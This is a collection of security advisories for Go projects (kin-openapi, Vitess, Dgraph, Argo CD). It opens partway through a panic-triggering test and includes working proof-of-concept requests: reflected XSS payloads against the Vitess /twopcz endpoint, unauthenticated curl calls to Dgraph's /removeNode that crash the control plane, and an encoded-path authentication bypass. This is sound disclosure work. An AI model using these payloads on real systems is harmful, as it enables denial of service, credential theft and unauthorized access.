		err = openapi3filter.ValidateRequest(r.Context(), &openapi3filter.RequestValidationInput{
			Request: r, PathParams: pathParams, Route: route,
			Options: &openapi3filter.Options{AuthenticationFunc: openapi3filter.NoopAuthenticationFunc},
		})
		if err != nil {
			http.Error(w, err.Error(), http.StatusBadRequest)
			return
		}
		w.WriteHeader(http.StatusOK)
	})

	srv := httptest.NewServer(mux)
	t.Cleanup(srv.Close)

	const n = 5
	for i := 0; i < n; i++ {
		resp, err := http.Post(srv.URL+"/f", "application/x-www-form-urlencoded", strings.NewReader("tags=a"))
		require.NoError(t, err)
		_, _ = io.ReadAll(resp.Body)
		_ = resp.Body.Close()
		require.Equal(t, http.StatusInternalServerError, resp.StatusCode)
	}
	require.Equal(t, n, panicCount)
}

func TestArrayItemsNilPanic_Deterministic(t *testing.T) {
	loader := openapi3.NewLoader()
	doc, err := loader.LoadFromData([]byte(urlencodedSpec31))
	require.NoError(t, err)
	require.NoError(t, doc.Validate(loader.Context))
	router, err := gorillamux.NewRouter(doc)
	require.NoError(t, err)

	const attempts = 50
	panics := 0
	for i := 0; i < attempts; i++ {
		req, err := http.NewRequest(http.MethodPost, "/f", strings.NewReader("tags=x"))
		require.NoError(t, err)
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		route, pathParams, err := router.FindRoute(req)
		require.NoError(t, err)
		if catchPanic(func() {
			_ = openapi3filter.ValidateRequest(context.Background(), &openapi3filter.RequestValidationInput{
				Request: req, PathParams: pathParams, Route: route,
				Options: &openapi3filter.Options{AuthenticationFunc: openapi3filter.NoopAuthenticationFunc},
			})
		}) != nil {
			panics++
		}
	}
	require.Equal(t, attempts, panics)
}
```

**Observed results on the vulnerable tree:**

- 3.1 accepts the schema (`Items == nil`); 3.0 rejects it
- urlencoded, multipart, and response-header paths all panic with `nil pointer dereference`
- **50/50** panic rate (100% deterministic)
- E2E httptest server: **5/5** POSTs panic inside `ValidateRequest` → HTTP 500

### Impact

- **Type:** NULL Pointer Dereference → **unauthenticated remote denial of service**.
- **Who is impacted:** applications using `github.com/getkin/kin-openapi/openapi3filter` to validate requests/responses against OpenAPI **3.1** documents that contain an `items`-less `type: array` in a urlencoded or multipart body property, or an array-typed response header (or other `parseArray` surfaces). Specs may be author mistakes, codegen output, or attacker-supplied where untrusted documents are loaded — `doc.Validate()` does **not** reject them under 3.1.
- **Attack:** a single unauthenticated POST (or response-validation hit) with a tiny non-empty body.
- **Consequence:** deterministic panic on every request to the operation. With stock `net/http`, the server logs `http: panic serving` and aborts the connection; without per-request recover (common outside pure `net/http` handlers), the process can crash.
- **Not affected:** OpenAPI 3.0 documents (spec validation rejects missing `items`); JSON request bodies (different decoder path that does not hit this `Items.Value` inspection).

### GHSA-v75v-6fpf-gvw8 — Vitess vttablet /twopcz reflected XSS
- Aliases: CVE-2026-104252 | Published: 2026-10-15 | Modified: 2026-10-15 | Severity: CRITICAL
- CWE: CWE-116, CWE-79, CWE-80
- CVSS_V3: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
- Affected Go/vitess.io/vitess: introduced:0 fixed:0.23.5
- Affected Go/vitess.io/vitess: introduced:0.24.0 fixed:0.24.2

From: xylove21
To: security@vitess.io
Subject: [Security Report] Vitess vttablet /twopcz reflected XSS
Date: Tue, 24 Jun 2026 14:30:00 +0800

## Summary

The `twopczHandler` in
`go/vt/vttablet/tabletserver/twopcz.go` (line 185) reflects the `Action`
and `dtid` form values directly into the HTML response body via
`fmt.Fprintln(w, msg)` — **without HTML escaping**. The response is served
as `text/html; charset=utf-8`, and Vitess's default `acl` policy is
**allow-all**, so the endpoint is reachable by anyone who can hit the
vttablet's HTTP port (default `15999`, multiplexed with gRPC and MySQL
wire-protocol ports).

A crafted `Action` or `dtid` value yields a **reflected XSS** that
executes in the operator's browser with same-origin access to the
vttablet's debug endpoints. This includes `/queryz` (live query plans),
`/querylogz` (recent queries with bound values), `/txlogz` (transactions),
`/debug/env` (environment variables — may include MySQL/topology
credentials), `/debug/vars` (expvar stats), and `/debug/pprof/*` if
enabled.

The bug was introduced before v20.0.0 (long-standing) and was silently
fixed in commit `3140c1846c` (merged 2026-06-09, PR #20255,
"tabletserver: escape reflected form values in twopcz handler"). The
fix replaces `fmt.Fprintln(w, msg)` with
`fmt.Fprintln(w, html.EscapeString(msg))`. **No released version of
Vitess contains the fix** — the fix lives only on `main` (current tip
`33a3c0fafe69`, 2026-06-23). There is **no CVE, GHSA, or OSV entry**
for this specific bug (verified 2026-06-24 against GitHub Advisory
Database, OSV.dev, and NVD).

## Impact

| Field | Value |
|-------|-------|
| **Type** | Reflected Cross-Site Scripting (XSS) |
| **CVSS 3.1** | `AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N` = **7.7 HIGH** |
| **Attack Vector** | Network (vttablet HTTP port 15999, multiplexed with gRPC/MySQL) |
| **Attack Complexity** | Low (craft URL, send to operator) |
| **Privileges Required** | None (default `acl` policy is allow-all) |
| **User Interaction** | Required (operator must visit crafted URL) |
| **Scope** | Changed (XSS chain reaction to other vttablet debug endpoints) |
| **Confidentiality** | High (query text, env vars, expvar stats) |
| **Integrity** | None (XSS itself doesn't change state) |
| **Availability** | None (XSS itself doesn't disrupt service) |

### Affected versions (verified)

All released versions are vulnerable. The fix lives only on `main`:

| Tag | Released | `twopcz.go` line 185 | Status |
|---|---|---|---|
| v20.0.0 | 2024-06-27 | `fmt.Fprintln(w, msg)` | **BUGGY** |
| v20.0.1 - v20.0.6 | 2024 | `fmt.Fprintln(w, msg)` | **BUGGY** |
| v22.0.4 | 2026-02-27 | `fmt.Fprintln(w, msg)` | **BUGGY** |
| v23.0.3, v23.0.4 | 2026-02 / 2026-05 | `fmt.Fprintln(w, msg)` | **BUGGY** |
| v24.0.0, v24.0.1 | 2026-04 / 2026-05 | `fmt.Fprintln(w, msg)` | **BUGGY** |
| **main** (`33a3c0fafe69`) | 2026-06-23 | `fmt.Fprintln(w, html.EscapeString(msg))` | **FIXED** |

### Sensitive data exposed via the same-origin XSS chain

A successful XSS lands in the vttablet's origin. From there, the
attacker can fetch (via `fetch()` from injected JavaScript) the
following same-origin endpoints, all of which are unauthenticated by
default:

- `/twopcz` — in-flight 2PC transactions (query text, parameters, dtid)
- `/queryz` — live query plans
- `/querylogz` — recent queries with bound values
- `/txlogz` — transactions
- `/debug/env` — environment variables (may include MySQL creds, topology
  credentials, encryption keys)
- `/debug/vars` — expvar stats
- `/debug/pprof/*` — CPU/memory profiles (if enabled)

## Reproduction (independent, runnable PoC)

The PoC is a self-contained Go HTTP server that replicates the buggy
`twopczHandler` from Vitess v20.0.0 verbatim (using the same line-185
code). It runs on `127.0.0.1:15080` and returns the same response shape
as the real Vitess endpoint.

```bash
# 1) Build the PoC (Go 1.23+)
cd /path/to/finding/CVE-pending-twopcz-xss
go build -o /tmp/vitess-twopcz-poc ./poc.go

# 2) Start the buggy server
ADDR=127.0.0.1:15080 /tmp/vitess-twopcz-poc &

# 3) Reproduce — Test 1: bare GET (no params)
curl -sS -i "http://127.0.0.1:15080/twopcz"
# → Content-Type: text/html; charset=utf-8, status 200

# 4) Test 2: XSS via Action param (URL-encode the script tag)
curl -sS -i "http://127.0.0.1:15080/twopcz?Action=%3Cscript%3Ealert(1)%3C%2Fscript%3E&dtid=zz"
# → Response body contains literal "<script>alert(1)</script>(zz): completed."
# → Browser executes the script as same-origin code

# 5) Test 3: XSS via dtid param (attribute-context payload)
curl -sS -i "http://127.0.0.1:15080/twopcz?Action=Demo&dtid=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E"
# → Response body contains literal "<img src=x onerror=alert(1)>"
# → Browser fires the onerror handler as same-origin code

# 6) Run the 3x automated runner (writes evidence/run-{1,2,3}.log)
bash ./poc/run.sh
```

PoC result excerpt (from `evidence/run-1.log`):

```
--- Test 2: XSS via Action=<script>alert(1)</script> ---
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
...
<h2>WARNING: Actions on this page can jeopardize data integrity.</h2>
<script>alert(1)</script>(zz): completed.

PASS: payload reflected UNESCAPED (XSS exploitable in browser)
```

The PoC was run 3 times on the buggy server (all 3/3 PASS) and the same
code is byte-identical to the v20.0.0 commit `8aeb274f6c8e` line 185.

## Root cause (technical detail)

`go/vt/vttablet/tabletserver/twopcz.go` (v20.0.0 through v24.0.1):

```go
// Line 185
fmt.Fprintln(w, msg)
```

`msg` is constructed earlier in the handler as:

```go
msg := fmt.Sprintf("%s(%s): completed.", action, dtid)
```

with `action` and `dtid` coming from the form values
`r.FormValue("Action")` and `r.FormValue("dtid")`. The form values are
URL-decoded (so a `+` becomes a space, `%3C` becomes `<`) but never
HTML-escaped. The handler explicitly sets `Content-Type: text/html;
charset=utf-8` (via the `<!DOCTYPE html>` it writes first), so the
browser executes any injected `<script>` or attribute-context payload.

The fix in main (`fmt.Fprintln(w, html.EscapeString(msg))`) closes the
hole by HTML-escaping both `action` and `dtid` before reflection.

## Suggested fix (already in main)

```go
// Recommended minimal patch (already in main, needs backport to all release branches):
import "html"

func twopczHandler(w http.ResponseWriter, r *http.Request) {
    // ... existing logic ...
    msg := fmt.Sprintf("%s(%s): completed.", action, dtid)
    fmt.Fprintln(w, html.EscapeString(msg))  // ← was: fmt.Fprintln(w, msg)
}
```

Backport the fix to v20.0.x, v22.0.x, v23.0.x, and v24.0.x as patch
releases. The fix is one line and a one-line `import "html"` addition,
so the backport risk is minimal.

## Workaround / mitigation (no patch available)

If you cannot upgrade to a fixed release immediately:

1. **Restrict the vttablet HTTP port** (default 15999) to localhost
   only. vttablet can run with `--tablet-allow-stats=false` and
   `--tablet-grpc-port` configured separately from the HTTP port, or
   you can firewall the HTTP port at the network layer. The debug
   endpoints are not needed by production traffic.

2. **Set a non-default ACL policy**. Vitess supports an `acl` policy
   that defaults to allow-all. Setting it to a JSON file that denies
   unauthenticated access to debug endpoints (see
   `go/acl/acl.go::savePolicy`) would block the XSS, but the default
   policy is currently `""` (allow-all) and many users don't override
   it.

3. **Use a reverse proxy** (nginx, envoy) in front of the vttablet
   HTTP port with a strict allowlist of clients.

## Cross-references

  - The bug is **not** related to:
    - CVE-2024-53257 (`/debug/querylogz` HTML injection, fixed in
      v20.0.4 — different endpoint)
    - CVE-2026-27969 (backup MANIFEST path traversal)
    - CVE-2026-27965 / GHSA-8g8j-r87h-p36x (backup external decompressor
      RCE)
  - PR #20255 is the fix commit; PR #19486 (defense-in-depth) is a
    separate hardening change

### GHSA-qj98-gp63-54xj — Dgraph: Zero Unauthenticated HTTP Admin removeNode Denial of Service
- Aliases: CVE-2026-102748 | Published: 2026-10-15 | Modified: 2026-10-15 | Severity: CRITICAL
- CWE: CWE-306, CWE-862
- CVSS_V4: `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:H/SC:N/SI:N/SA:H`
- Affected Go/github.com/dgraph-io/dgraph/v25: introduced:0 fixed:25.4.0

### Summary

Dgraph `v25.3.8` exposes a Zero HTTP administrative surface that is unauthenticated when port `6080` is reachable.

The exposed routes include:

- `/state`
- `/assign`
- `/removeNode`
- `/moveTablet`

An unauthenticated request to `/removeNode?id=1&group=0` on a single-node standalone deployment breaks the Zero control plane and leaves Alpha repeatedly failing to reconnect to `localhost:5080`.

### Details

The issue exists because Zero administrative HTTP endpoints are registered directly without any authentication or IP-whitelist wrapper.

Relevant code paths:

- `worker/server_state.go:41`
- `dgraph/cmd/zero/run.go:295-301`
- `dgraph/cmd/zero/http.go:106-129`
- `dgraph/cmd/zero/zero.go:475-477`

The relevant behavior is:

- `disable-admin-http=false` by default
- `/removeNode` accepts attacker-controlled `id` and `group`
- `removeNode` forwards those directly into `Server.RemoveNode`
- for `group=0`, `Server.RemoveNode` immediately calls `ProposePeerRemoval`

This means a remote unauthenticated caller can directly trigger destructive membership operations if `6080` is exposed.

### PoC

### Read state without authentication

```bash
curl -i http://127.0.0.1:6080/state
```

Observed response included:

- Zero node `id=1`
- `groupId=0`
- `leader=true`
- cluster topology and tablet state

<img width="1878" height="810" alt="图片" src="https://github.com/user-attachments/assets/c6a0001c-bcf7-45b6-a301-481f918be98a" />

### Write-capable route without authentication

```bash
curl -i 'http://127.0.0.1:6080/assign?what=nsids&num=1'
```

Observed response:

```text
HTTP/1.1 200 OK
...
{"startId":"1", "endId":"1", "readOnly":"0"}
```

This confirms the admin plane is not merely informational.

<img width="1877" height="805" alt="图片" src="https://github.com/user-attachments/assets/caf60927-83ba-495d-8c55-e48343b8a2c7" />

### Destructive unauthenticated removeNode

```bash
curl -i 'http://127.0.0.1:6080/removeNode?id=1&group=0'
```

Observed result:

```text
curl: (52) Empty reply from server
```

<img width="1877" height="806" alt="图片" src="https://github.com/user-attachments/assets/a837c385-1c2d-42b6-a5c9-0d93a974ff4e" />

Immediately afterward:

```bash
curl -i http://127.0.0.1:6080/health
```

Observed result:

```text
curl: (56) Recv failure: Connection reset by peer
```

<img width="786" height="47" alt="图片" src="https://github.com/user-attachments/assets/bd5e977d-d046-4626-b3df-155b141564fa" />

Alpha health was still locally reachable, but Alpha logs began repeatedly reporting:

```text
dial tcp [::1]:5080: connect: connection refused
```

<img width="1688" height="197" alt="图片" src="https://github.com/user-attachments/assets/8ae3bb84-65bc-4951-ad32-5e1c3231c894" />

This confirms the request reached the destructive path and disrupted the Zero control plane.

### Impact

Any deployment that exposes Zero HTTP on `6080` exposes destructive unauthenticated administrative capabilities.

An attacker can:

- read cluster topology and control-plane metadata
- allocate IDs and timestamps
- invoke destructive membership actions
- disrupt the Zero control plane
- indirectly destabilize Alpha nodes that depend on Zero connectivity

This is a high-value unauthenticated administrative exposure and, in the reproduced case, a practical denial of service against the control plane.

### GHSA-23vg-4cjm-66q5 — kin-openapi: ValidationHandler security-requirement bypass via encoded-path operation confusion
- Aliases: CVE-2026-100351 | Published: 2026-10-15 | Modified: 2026-10-15 | Severity: HIGH
- CWE: CWE-289, CWE-436
- CVSS_V3: `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N`
- Affected Go/github.com/getkin/kin-openapi: introduced:0.144.0 fixed:0.147.0

## Summary

`openapi3filter.ValidationHandler.Middleware` validates requests with kin-openapi's
legacy router, which selects an OpenAPI operation from the decoded `URL.Path`. The
method is documented as implementing `gorilla/mux.MiddlewareFunc`, but a downstream
gorilla/mux router configured with `UseEncodedPath()` selects its handler from the
encoded representation (`URL.RawPath`).

An unauthenticated request such as `/public%2Fstatus` can therefore be validated as an
intentionally public operation (`/public/status`) and then dispatched to a protected
operation (`/{id}`). The configured, rejecting `AuthenticationFunc` is never invoked,
and the protected downstream handler runs.

This is distinct from GHSA-r277-6w6q-xmqw. The behavior below uses an explicit
authentication callback that rejects missing credentials and remains reproducible
after the v0.144.0 fix for the unsafe default callback.

## Affected products

- Product: `github.com/getkin/kin-openapi`
- Component: `openapi3filter.ValidationHandler.Middleware`
- Confirmed post-GHSA affected releases: v0.144.0, v0.145.0, and v0.146.0
- Reporter attestation: each listed release was checked out separately, the attached
  single-file test was copied into `openapi3filter/`, and that test passed; maintainers
  should independently confirm the version range
- Confirmed affected development revision: `d33e44e67734dcde81b576582185e1343fb3985d`
- v0.143.0 also reproduces this mechanism, but GHSA-r277-6w6q-xmqw already provides a
  simpler bypass on that release; the distinct post-fix claim starts at v0.144.0
- Earlier releases: not tested; please treat the introduction boundary as unknown

## Security impact

An unauthenticated remote requester can reach a handler whose OpenAPI operation
requires authentication when all of the following are true:

1. the application uses `ValidationHandler.Middleware` as the security gate;
2. the downstream router preserves and interprets an encoded path, such as
   gorilla/mux with `UseEncodedPath()`;
3. a public exact route and a protected parameterized route overlap after decoding;
4. the public and protected operations expose the same HTTP method;
5. the protected handler relies on the validation layer's security decision.

The protected operation's path-parameter value is constrained: it is an encoded
representation that decodes to a public literal path (`public%2Fstatus` in this PoC),
not an arbitrary attacker-selected identifier. A protected operation without a
compatible parameterized path is not reachable through this specific mechanism.

- Primitive: the security decision is made for a different OpenAPI operation than the
  operation dispatched by the application router.
- Demonstrated impact: a protected handler executes while the explicitly rejecting
  `AuthenticationFunc` is never invoked.
- Impact ceiling: confidentiality or integrity loss when the reachable protected
  handler has that authority; the PoC does not demonstrate data disclosure or state
  modification.
- Availability impact: not demonstrated.

## Root cause

At the confirmed development revision:

- `openapi3filter/validation_handler.go`: `ValidationHandler.Load` constructs
  `routers/legacy.NewRouter` unconditionally.
- `routers/legacy/router.go`: route selection uses the decoded request path.
- `routers/gorillamux/router.go`: the kin-openapi gorilla router constructs a
  gorilla/mux router with `UseEncodedPath()`.
- `ValidationHandler.Middleware` forwards the unchanged request after validation.

The component making the authentication decision and the component dispatching the
handler can therefore disagree about the selected operation.

## Reproduction

The attached PoC uses a real `net/http` server, an explicit API-key callback that
rejects missing credentials, and a downstream gorilla/mux router with
`UseEncodedPath()`.

From a kin-openapi checkout, copy the self-contained attachment
`encoded_path_route_confusion_test.go.txt` into `openapi3filter/` as
`encoded_path_route_confusion_test.go`, then run:

```sh
go test -v ./openapi3filter -run '^TestEncodedPathAuthorizationBypass$' -count=1
```

Expected attack observation:

```text
status=202 downstream_route=/{id} protected_id=public%2Fstatus authentication_calls=0
wiring=Router.Use status=202 downstream_route=/{id} protected_id=public%2Fstatus authentication_calls=0
```

Controls included in the test show that:

- `/ordinary` selects the protected operation, invokes authentication once, and is
  rejected with HTTP 401;
- `/public/status` reaches only the intentionally public handler;
- the encoded request reaches the protected `/{id}` handler with HTTP 202 while the
  authentication callback remains uncalled;
- both external wrapping and the documented
  `router.Use(validationHandler.Middleware)` wiring reproduce the same result.

## Reverse-proxy reachability

The same request was reproduced through Nginx 1.31.3 using the official
`nginx:alpine` image digest
`sha256:4a73073bd557c65b759505da037898b61f1be6cbcc3c2c3aeac22d2a470c1752`.

The exact container invocation was:

```sh
docker run --rm --name kin-openapi-nginx \
  --add-host=host.docker.internal:host-gateway \
  -p 18081:8080 -p 18082:8081 \
  -v "$PWD/poc/nginx.conf:/etc/nginx/nginx.conf:ro" \
  nginx:alpine
```

Container port 8080 uses `proxy_pass http://host.docker.internal:18080;` without a
replacement URI. Host port 18081 therefore preserved `/public%2Fstatus`; the protected
handler returned HTTP 202 and the
authentication callback remained at zero calls. With
`proxy_pass http://host.docker.internal:18080/;` on container port 8081 / host port
18082, Nginx canonicalized the upstream URI; both layers selected `/public/status` and
the bypass did not occur.

Nginx access-log observations:

```text
server_port=8080 "GET /public%2Fstatus HTTP/1.1" 202 0 "curl/8.7.1"
server_port=8081 "GET /public%2Fstatus HTTP/1.1" 204 0 "curl/8.7.1"
server_port=8080 "GET /ordinary HTTP/1.1" 401 0 "curl/8.7.1"
```

The response route headers were `X-Poc-Route: /{id}` on the preserving listener and
`X-Poc-Route: /public/status` on the canonicalizing listener. Backend observations for
the two requests were:

```text
request_uri="/public%2Fstatus" path="/public/status" raw_path="/public%2Fstatus" auth_before=0
completed request_uri="/public%2Fstatus" auth_after=0
request_uri="/public/status" path="/public/status" raw_path="" auth_before=0
completed request_uri="/public/status" auth_after=0
```

This control shows that upstream path handling is a deployment precondition rather
than claiming that every proxy configuration is affected.

The canonical protected control produced:

```text
request_uri="/ordinary" path="/ordinary" raw_path="" auth_before=0
completed request_uri="/ordinary" auth_after=1
```

## Suggested remediation

The authentication layer and downstream dispatcher must select the same OpenAPI
operation from the same request representation.

Potential approaches:

1. make `ValidationHandler` accept a caller-supplied `routers.Router` and require it to
   match downstream routing semantics;
2. document that `NewValidator` already accepts a router but is safe only when the
   supplied router selects operations using the same semantics as the dispatcher;
   callers must also supply an `AuthenticationFunc` through `ValidationOptions`, or
   protected requests fail with the existing missing-authentication-service error;
3. as an interim hardening option, make `ValidationHandler` fail closed on an encoded
   path separator when `URL.Path` and `URL.RawPath` can select different operations,
   and verify this behavior against the full suite;
4. document the route-identity requirement and add encoded-separator regression tests.

Replacing the legacy router with the kin-openapi gorilla router closes this PoC, but a
local compatibility check changed two existing missing-path-parameter tests from HTTP
400 semantics to route-not-found HTTP 404 semantics. A direct router swap is therefore
not a fully validated drop-in fix.

## Public-reference triage

The public advisory list and related path-encoding reports reviewed on 2026-08-18 did
not describe this authentication-boundary crossing. Relevant nearby reports include
issues #397, #1089, and #1105 and PR #400. This search is not proof of novelty; please
deduplicate against private reports.

- https://github.com/getkin/kin-openapi/commit/eda80e2676e9f577ceed2dd80e64f16083edb041 [WEB]

### GHSA-fmxq-cgp8-87wp — Argo CD: AppProject destination-namespace and resource restrictions bypassed by PreDelete/PostDelete resource hooks
- Aliases: CVE-2026-77459 | Published: 2026-10-15 | Modified: 2026-10-15 | Severity: CRITICAL
- CWE: CWE-863
- CVSS_V3: `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H`
- Affected Go/github.com/argoproj/argo-cd/v2: introduced:2.10.0 last_affected:2.14.21
- Affected Go/github.com/argoproj/argo-cd/v3: introduced:3.0.0 fixed:3.3.15
- Affected Go/github.com/argoproj/argo-cd/v3: introduced:3.4.0 fixed:3.4.10
- Affected Go/github.com/argoproj/argo-cd/v3: introduced:3.5.0 fixed:3.5.4
- Affected Go/github.com/argoproj/argo-cd/v3: introduced:3.6.0-rc1 fixed:3.6.0-rc2

### Impact

Argo CD checks an Application's AppProject before it creates resources during a sync. That check covers destination namespaces and servers, cluster-scoped resource allow and deny lists, and namespaced resource allow and deny lists, including resource names. PreDelete and PostDelete hooks skip it. When the Application is deleted, Argo CD creates those hooks with the application-controller's credentials on the destination cluster.

All versions from v2.10.0 onward are affected, including every currently supported release. v2.9.22 and earlier are not. PostDelete hooks were introduced in [dcc17f70bf](https://github.com/argoproj/argo-cd/commit/dcc17f70bf7db973fe480b8b613189b2c5ac4b4b) (2023-12-18, [#16595](https://github.com/argoproj/argo-cd/pull/16595)) and first released in v2.10.0. That creation path has never applied the project check. PreDelete hooks, added in [3bf3d8a212](https://github.com/argoproj/argo-cd/commit/3bf3d8a2124e772ac651f3fd42375c4e9b8008af) (2025-12-05, [#22288](https://github.com/argoproj/argo-cd/pull/22288)) and first released in v3.3.0, use the same path. v3.2.12 and earlier do not have PreDelete hooks. PreSync, Sync, PostSync, and SyncFail hooks still go through the project check.

A user who can push to the Git repository an Application syncs from can commit a hook whose namespace, group, kind, or name the AppProject would refuse on sync. The controller adds the delete finalizer when it sees the hook, and the Application stays Synced until someone deletes it. Deleting the Application creates the hook. What that can reach is bounded by the application-controller's access to the destination cluster. In a typical install that access is broad, so a tenant can create a cluster-scoped object such as a `ClusterRoleBinding`, or an object in a namespace the project does not allow. A hook with no deletion policy is removed after it succeeds. A deletion policy that does not remove the hook on success leaves the object in the cluster. A hook such as a Job can create further objects that Argo CD does not clean up.

### Patches

A patch for this vulnerability has been released in the following Argo CD versions:

* v3.6.0-rc2
* v3.5.4
* v3.4.10
* v3.3.15

The fix applies the same AppProject destination and resource checks used on sync before creating a PreDelete or PostDelete hook.

Argo CD 2.x and 3.0 through 3.2 are out of support and will not receive a patch. Upgrade to a patched 3.3 or newer release.

### Workarounds

There is no configuration setting that applies the project check to delete hooks while those hooks stay in use.

* Do not grant untrusted users write access to Git repositories that back Applications in restrictive AppProjects.
* Limit who can delete Applications. Deletion is what runs PreDelete and PostDelete hooks.
* Tighten the application-controller's Kubernetes access so a hook cannot reach sensitive namespaces or APIs.

### Credits

The Argo CD team would like to thank @RealFakeAccount, @AdamKorcz, @0xshylines, @thevilledev, @HenriWilliams, @cherez0ff, @ARSB1, and @zwindler for responsibly disclosing this issue according to our [security reporting guidelines](https://github.com/argoproj/argo-cd/blob/master/SECURITY.md#reporting-a-vulnerability).

### References
